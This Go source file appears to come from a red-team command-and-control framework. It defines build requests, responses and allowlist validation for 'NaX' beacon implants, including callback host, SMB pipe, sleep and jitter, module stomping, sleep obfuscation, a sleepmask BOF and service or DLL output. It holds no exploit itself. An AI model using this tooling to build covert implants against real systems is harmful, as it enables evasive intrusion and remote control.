package naxbuilder

import (
	"encoding/hex"
	"fmt"
)

// NaxBuildRequest is the fully server-derived instruction for one payload build.
// It contains no caller-provided paths, Make targets, or shell fragments — the
// worker chooses the Make target and paths from Transport/Debug/FullRebuild.
type NaxBuildRequest struct {
	Transport   string `json:"transport"` // "http" | "smb" — allowlisted
	Debug       bool   `json:"debug"`
	FullRebuild bool   `json:"fullRebuild"`

	// HTTP transport fields.
	CallbackHost string `json:"callbackHost"`
	CallbackPort int    `json:"callbackPort"`
	BootURI      string `json:"bootURI"`
	SSL          bool   `json:"ssl"`

	// SMB transport field.
	PipeName string `json:"pipeName"`

	SleepMs    uint32   `json:"sleepMs"`
	JitterPct  uint32   `json:"jitterPct"`
	EncKeyHex  string   `json:"encKeyHex"` // 32 hex chars -> 16 bytes
	Watermark  string   `json:"watermark"`  // hex, parsed base-16 by caller
	LyWM       string   `json:"lyWm"`       // listener watermark, hex

	GateAPIs     []string `json:"gateAPIs"`
	StompMode    bool     `json:"stompMode"`    // enabled
	StompAdv     bool     `json:"stompAdv"`     // enabled
	StompDll     string   `json:"stompDll"`
	StompUnwind  bool     `json:"stompUnwind"`
	ThreadPool   bool     `json:"threadPool"`
	BofStomp     bool     `json:"bofStomp"`
	BofStompDll  string   `json:"bofStompDll"`
	BofStompPool []string `json:"bofStompPool"`
	SmStompDll   string   `json:"smStompDll"`
	SleepObf     string   `json:"sleepObf"`     // "0" | "1"
	OutputFormat string   `json:"outputFormat"` // "bin" | "exe" | "dll" | "svc" — allowlisted
	SvcName      string   `json:"svcName"`
	DllExport    string   `json:"dllExport"`

	// BeaconGate: builder builds the sleepmask BOF and returns its .o bytes.
	BeaconGate   bool   `json:"beaconGate"`
	EmbedSleep   bool   `json:"embedSleep"` // if true, builder embeds sleepmask .o into Config.h

	// Pre-generated headers (server keeps the pure-Go generators). Base64 of the
	// exact bytes the old code wrote to src_beacon/include/.
	ConfigH       []byte `json:"configH"`
	ConfigProfile []byte `json:"configProfile"`
}

// NaxBuildResponse carries the raw payload components back to the server, which
// repacks them with the in-process packNaxBin(...).
//
// []byte values (and the map of them) marshal to base64 strings over the wire;
// the server base64-decodes them.
type NaxBuildResponse struct {
	Filename string                `json:"filename"`
	Size     int                   `json:"size"`
	SHA256   string                `json:"sha256"`
	Components map[string][]byte `json:"components"` // "loader"|"beacon"|"pdata"|"xdata"|"textRva"
	Flags    string                `json:"flags"` // "0x%04x"
	StompDll string                `json:"stompDll"`
	SleepmaskO []byte              `json:"sleepmaskO,omitempty"` // only if BeaconGate
	OK       bool                  `json:"ok"`
}

// NaxBuildError is the body used on an error frame. It has no OK field, so the
// server distinguishes success/failure by inspecting the JSON for "ok": true.
type NaxBuildError struct {
	Error string `json:"error"`
}

// Validate enforces the small allowlists the worker relies on: Transport ∈
// {http,smb}, OutputFormat ∈ {bin,exe,dll,svc}, and EncKeyHex (if present) is 32
// hex chars decoding to 16 bytes. Anything else is malformed — rejected before
// any work happens.
func (r *NaxBuildRequest) Validate() error {
	switch r.Transport {
	case "http", "smb":
	default:
		return fmt.Errorf("transport %q not allowed (want \"http\" or \"smb\")", r.Transport)
	}

	switch r.OutputFormat {
	case "bin", "exe", "dll", "svc":
	default:
		return fmt.Errorf("outputFormat %q not allowed (want bin|exe|dll|svc)", r.OutputFormat)
	}

	if r.EncKeyHex != "" {
		if len(r.EncKeyHex) != 32 {
			return fmt.Errorf("encKeyHex must be 32 hex chars, got %d", len(r.EncKeyHex))
		}
		if _, err := hex.DecodeString(r.EncKeyHex); err != nil {
			return fmt.Errorf("encKeyHex is not valid hex: %w", err)
		}
	}

	return nil
}

// ComponentPath returns the on-disk path of a component relative to the NaX
// source root, for a given transport + debug combination. It mirrors NaX/Makefile.
func ComponentPath(transport string, debug bool, name string) string {
	beaconDir := "http"
	if transport == "smb" {
		beaconDir = "smb"
	}
	prefix := "beacon"
	if debug {
		prefix = "beacon.debug"
	}

	switch name {
	case "loader":
		return "src_loader/bin/nax_loader.x64.bin"
	case "beacon":
		if debug {
			return "src_beacon/build/" + beaconDir + "/beacon.x64.debug.bin"
		}
		return "src_beacon/build/" + beaconDir + "/beacon.x64.bin"
	case "pdata":
		return "src_beacon/build/" + beaconDir + "/" + prefix + ".pdata.bin"
	case "xdata":
		return "src_beacon/build/" + beaconDir + "/" + prefix + ".xdata.bin"
	case "textRva":
		return "src_beacon/build/" + beaconDir + "/" + prefix + ".text_rva"
	case "sleepmask":
		return "src_sleepmask/dist/sleepmask.x64.o"
	}
	return ""
}
